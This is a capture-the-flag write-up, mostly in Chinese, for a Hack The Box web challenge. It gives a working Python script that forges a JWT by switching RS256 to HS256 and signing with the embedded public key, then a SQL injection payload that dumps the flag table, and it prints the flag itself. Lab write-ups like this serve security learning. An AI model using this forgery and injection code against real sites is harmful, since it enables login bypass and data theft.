# Under Construction

A company that specialises in web development is creating a new site that is currently under construction. Can you obtain the flag?

### Solution 
* 一開始先註冊一下
* 登入之後看到 cookie，熟悉的背影 --- JWT
* 稍微用 https://jwt.io/ 看一下
    ~~~jwt=
    header = {
      "alg": "RS256",
      "typ": "JWT"
    }
    
    payload = {
      "username": "entroy",
      "pk": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n",
      "iat": 1608481629
    }
    ~~~
* 嘿對，有 public key，可以參考 https://xz.aliyun.com/t/6776 的「修改RSA加密算法为HMAC」
* 之後照著他的方法，把 header 中的 alg 改成 HS256，之後使用公鑰 pk 對 token 進行簽名之後修改 cookie 送出
* 在這裡我用 python script 達成這一件事
    ~~~python3=
    import jwt
    import requests
    import sys
    from bs4 import BeautifulSoup

    def token(username):
        pk = '''-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n'''
        payload = {'username' : username, 'pk' : pk, 'iat' : '1608481629'}
        return jwt.encode(payload, key=pk, algorithm="HS256").decode()

    def send_request(username):
        url = 'http://134.209.29.219:30323/'
        cookies = {'session' : token(username)}
        print(BeautifulSoup(requests.get(url, cookies=cookies).text, 'html.parser').find('div', class_='card-body').get_text())

    if __name__ == '__main__':
        username = sys.argv[1]
        send_request(username)
    ~~~
    * 需要注意的事，pyjwt 的版本問題
        * `pip3 install pyjwt==0.4.3`
    * 使用腳本的方法
        * `python3 script.py "entroy"`
* 題目用的是 sqlite，因為當時試到 `database()` = =
* 最後拿到 flag 的 payload `python3 solve.py "123' union select 1,(SELECT top_secret_flaag from flag_storage),3 -- " | grep Welcome`
* flag : `HTB{d0n7_3xp053_y0ur_publ1ck3y}`
